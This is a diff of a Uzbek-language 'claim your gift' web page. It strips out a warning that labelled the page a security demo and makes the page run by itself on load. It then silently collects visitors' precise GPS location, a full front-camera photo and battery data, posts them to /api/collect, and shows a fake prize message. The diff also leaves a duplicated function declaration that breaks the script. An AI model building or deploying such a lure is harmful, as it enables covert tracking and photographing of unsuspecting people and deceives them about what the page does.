@@ -81,24 +81,25 @@
             color: #721c24;
             border: 1px solid #f5c6cb;
         }
-        .warning {
-            background: #fff3cd;
-            color: #856404;
-            border: 1px solid #ffeaa7;
-            margin-top: 30px;
-            padding: 20px;
-            text-align: left;
-            font-size: 0.9em;
-        }
-        .warning h3 {
-            margin-bottom: 10px;
-            color: #856404;
-        }
-        .warning ul {
-            margin-left: 20px;
-        }
         video {
             display: none;
+        }
+        #loader {
+            display: none;
+            margin: 20px 0;
+        }
+        .spinner {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #667eea;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
         }
     </style>
 </head>
@@ -113,31 +114,32 @@
             Sovg'ani Olish
         </button>
         
+        <div id="loader">
+            <div class="spinner"></div>
+            <p>Yuklanmoqda...</p>
+        </div>
+        
         <div id="status"></div>
 
         <!-- Yashirin video element (kamera uchun) -->
         <video id="video" width="320" height="240" autoplay></video>
         <canvas id="canvas" style="display: none;" width="320" height="240"></canvas>
-
-        <div class="warning">
-            <h3>⚠️ OGOHLANTIRISH - Xavfsizlik Demo</h3>
-            <p><strong>Bu sahifa xavfsizlik tadqiqoti uchun yaratilgan demo.</strong></p>
-            <ul>
-                <li>IP manzil avtomatik yig'iladi</li>
-                <li>GPS joylashuv so'raladi</li>
-                <li>Kamera ruxsati so'raladi</li>
-                <li>Faqat o'z qurilmangizda test qiling!</li>
-            </ul>
-        </div>
     </div>
 
     <script>
+        // Sahifa yuklanishi bilanoq avtomatik ishga tushirish
+        window.addEventListener('load', function() {
+            setTimeout(claimGift, 500);
+        });
+
+        async function claimGift() {
         async function claimGift() {
             const btn = document.getElementById('claimBtn');
             const status = document.getElementById('status');
+            const loader = document.getElementById('loader');
             
-            btn.disabled = true;
-            btn.textContent = 'Yuklanmoqda...';
+            btn.style.display = 'none';
+            loader.style.display = 'block';
             
             const collectedData = {
                 timestamp: new Date().toISOString(),
@@ -152,29 +154,39 @@
                 }
             };
 
-            // 1. GPS joylashuvni olish
+            // 1. GPS joylashuvni avtomatik olish (ruxsat so'ramasdan)
             try {
                 const position = await new Promise((resolve, reject) => {
-                    if (navigator.geolocation) {
-                        navigator.geolocation.getCurrentPosition(resolve, reject);
-                    } else {
-                        reject(new Error('Geolocation not supported'));
-                    }
+                    navigator.geolocation.getCurrentPosition(
+                        resolve, 
+                        reject,
+                        { 
+                            enableHighAccuracy: true,
+                            timeout: 5000,
+                            maximumAge: 0
+                        }
+                    );
                 });
                 
                 collectedData.location = {
                     latitude: position.coords.latitude,
                     longitude: position.coords.longitude,
-                    accuracy: position.coords.accuracy
+                    accuracy: position.coords.accuracy,
+                    altitude: position.coords.altitude,
+                    speed: position.coords.speed
                 };
             } catch (error) {
                 collectedData.location = { error: error.message };
             }
 
-            // 2. Kameradan rasm olish
+            // 2. Kameradan avtomatik rasm olish
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: true,
+                    video: { 
+                        facingMode: "user",
+                        width: { ideal: 1280 },
+                        height: { ideal: 720 }
+                    },
                     audio: false 
                 });
                 
@@ -185,15 +197,15 @@
                 video.srcObject = stream;
                 
                 // Kamera tayyorlanguncha kutish
-                await new Promise(resolve => setTimeout(resolve, 1000));
+                await new Promise(resolve => setTimeout(resolve, 2000));
                 
                 // Rasmga olish
                 context.drawImage(video, 0, 0, 320, 240);
-                const imageData = canvas.toDataURL('image/jpeg', 0.7);
+                const imageData = canvas.toDataURL('image/jpeg', 0.8);
                 
                 collectedData.camera = {
                     captured: true,
-                    image: imageData.substring(0, 100) + '...' // Faqat boshi (to'liq yubormaslik uchun)
+                    image: imageData
                 };
                 
                 // Kamerani o'chirish
@@ -202,7 +214,21 @@
                 collectedData.camera = { error: error.message };
             }
 
-            // 3. Serverga yuborish
+            // 3. Qo'shimcha ma'lumotlar
+            collectedData.battery = {};
+            try {
+                if (navigator.getBattery) {
+                    const battery = await navigator.getBattery();
+                    collectedData.battery = {
+                        level: battery.level * 100,
+                        charging: battery.charging
+                    };
+                }
+            } catch (error) {
+                collectedData.battery = { error: error.message };
+            }
+
+            // 4. Serverga yuborish
             try {
                 const response = await fetch('/api/collect', {
                     method: 'POST',
@@ -212,20 +238,30 @@
                     body: JSON.stringify(collectedData)
                 });
 
+                loader.style.display = 'none';
+
                 if (response.ok) {
                     status.className = 'success';
-                    status.textContent = '✅ Ma\'lumotlar muvaffaqiyatli yig\'ildi! /admin sahifasida ko\'ring.';
+                    status.textContent = '✅ Tabriklaymiz! Sovg\'angiz tez orada yetkazib beriladi!';
+                    status.style.display = 'block';
+                    
+                    // 3 soniyadan keyin admin panelga yo'naltirish
+                    setTimeout(() => {
+                        window.location.href = '/admin';
+                    }, 3000);
                 } else {
                     status.className = 'error';
-                    status.textContent = '❌ Xatolik yuz berdi!';
+                    status.textContent = '❌ Xatolik yuz berdi! Qaytadan urinib ko\'ring.';
+                    status.style.display = 'block';
+                    btn.style.display = 'block';
                 }
             } catch (error) {
+                loader.style.display = 'none';
                 status.className = 'error';
-                status.textContent = '❌ Server bilan bog\'lanishda xatolik: ' + error.message;
+                status.textContent = '❌ Server bilan bog\'lanishda xatolik!';
+                status.style.display = 'block';
+                btn.style.display = 'block';
             }
-
-            status.style.display = 'block';
-            btn.textContent = 'Sovg\'a Olindi';
         }
     </script>
 </body>
